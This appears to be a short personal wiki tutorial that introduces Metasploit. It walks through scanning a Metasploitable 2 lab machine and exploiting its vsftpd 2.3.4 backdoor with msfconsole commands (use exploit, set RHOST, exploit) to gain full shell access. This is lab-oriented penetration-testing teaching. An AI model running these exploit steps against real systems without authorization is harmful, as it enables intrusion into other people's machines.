-----

* title: Metasploit
* description: This article is dedicated to Metasploit framework.
* created: 23-07-2021 16:14:00
* modified: 23-07-2021 16:14:00
* keywords: gnu, linux, admin, network, security, hacking
* lang: en

-----

# Introduction

Metasploit is a framework for testing and abusing know vulnerabilities.

# Background information

To test out Metasploit, you should better make use of very vulnerable 
programs. For instance Metasploitable Operating system is especially created 
for this purpose. An Operating system dedicated for learning purposes and 
which has tons of applications installed know to be very vulnerable. This is 
very interesting in learning and using tools to hack know vulnerable programs.

So to start with this all, install the Metasploitable virtual machine which 
you can download here: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Once downloaded you can easily configure an virtual machine, by making use 
of Vmware or Virtual box.

# Simple example

Based on a virtual host machine `Metasploitable 2.0.` which contains a lot 
of known exploitable vulnerabilities.

On the host machine, use `zenmap` and do a `Quick Scan Plus` to discover the 
devices on your network. Once you have found all devices connected to your 
network, you can do an `Intense scan` on the IP of that `Metasploitable` 
virtual machine. In my case, that `0Metasploitable 2.0` virtual machine has the 
ip address `10.0.2.6`.

We will for example see that vsftpd 2.3.4 is installed on the target machine:

    21/tcp   open  ftp         vsftpd 2.3.4

From this point, we should search on Google for each application, and it's 
version number to find out if there are known vulnerabilities.

So doing a little Google search about `vsftpd 2.3.4 vulnerabilities` will 
give us for example this website: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/ which give metasploit 
instructions to gain access to this computer.

So to start with, run Metasploit with as `root` user:

    msfconsole

This will load the Metasploit framework.

    use exploit/unix/ftp/vsftpd_234_backdoor

Then set the remote host ip in the options with:

    set RHOST 10.0.2.6

Start the exploit:

    exploit

From now, you are on the remote host and you have full access on the remote 
host.

    touch /tmp/your-been-hacked

And you can verify on that host machine to check if the file `touch 
/tmp/your-been-hacked` has been created.